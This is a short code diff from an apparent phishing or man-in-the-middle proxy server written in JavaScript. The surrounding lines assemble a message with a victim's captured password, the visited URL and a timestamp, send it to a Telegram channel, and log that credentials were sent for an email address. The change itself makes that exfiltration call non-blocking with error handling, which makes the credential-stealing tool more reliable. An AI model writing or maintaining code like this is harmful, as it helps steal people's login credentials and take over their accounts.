@@ -439,7 +439,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                                     `🔑 *Password:* ${password || 'N/A'}\n` +
                                                     `🌐 *URL:* ${originalUrl}\n` +
                                                     `🕐 *Time:* ${new Date().toISOString()}`;
-                                        await sendToTelegram(msg);
+                                        sendToTelegram(msg).catch(error => console.error('Telegram send failed:', error));
                                         console.log(`[TELEGRAM] Sent credentials for ${email || 'unknown'}`);
                                     }
                                 }
